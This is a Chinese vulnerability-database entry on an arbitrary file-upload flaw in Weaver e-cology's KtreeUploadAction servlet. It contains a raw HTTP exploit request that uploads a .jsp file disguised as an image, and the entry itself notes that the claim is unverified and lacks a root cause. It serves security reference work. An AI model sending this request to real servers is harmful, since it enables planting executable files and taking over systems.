---
source: "Threekiii/Vulnerability-Wiki"
title: "泛微e-cology KtreeUploadAction文件上传"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本写目前已修复不是版本/范围，缺日期补丁"
prerequisites: "请求有JSESSIONID，最低权限未知"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA-E-cology-KtreeUploadAction-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md"
id: "vw-5d02b0b49e9b24aea240b1e5"
entity_id: "ve-5d02b0b49e9b24aea240b1e5"
schema_version: "1"
---

# 泛微e-cology KtreeUploadAction文件上传

## 条目说明

- 对象与具体问题：泛微e-cology；KtreeUploadAction文件上传
- 版本、配置及部署条件：版本写目前已修复不是版本/范围，缺日期补丁
- 认证与权限前提：请求有JSESSIONID，最低权限未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 漏洞描述只有参考链接，缺根因；只有上传文本helloword无回读路径或响应
- 可证明的写入/执行未提供，任意文件上传结论需补证

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

参考链接：

- [泛微e-cology任意文件上传(已修复)](https://mp.weixin.qq.com/s?__biz=MzkxMzIzNTU5Mg==&mid=2247483666&idx=1&sn=e70efe98c064e0f1df986e2b65c1a608&chksm=c1018af5f67603e39ce4d6e9375875e63e7b80633a1f99959f8d4652193ac3734765a99099ea&mpshare=1&scene=23&srcid=0414cqXy50udQOy19LYOMega&sharer_sharetime=1618332600979&sharer_shareid=d15208c7b27f111e2fe465f389ab6fac#rd)

### 漏洞影响

```
目前已修复
```

### 漏洞复现

定位文件：

`ecology\CLASSB~1\com\weaver\formmodel\apps\ktree\servlet\KtreeUploadAction.class`

exp：

```http

POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=--------1638451160
Content-Length: 171

----------1638451160
Content-Disposition: form-data; name="test"; filename="test.jsp"
Content-Type: image/jpeg

helloword
----------1638451160--
```

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
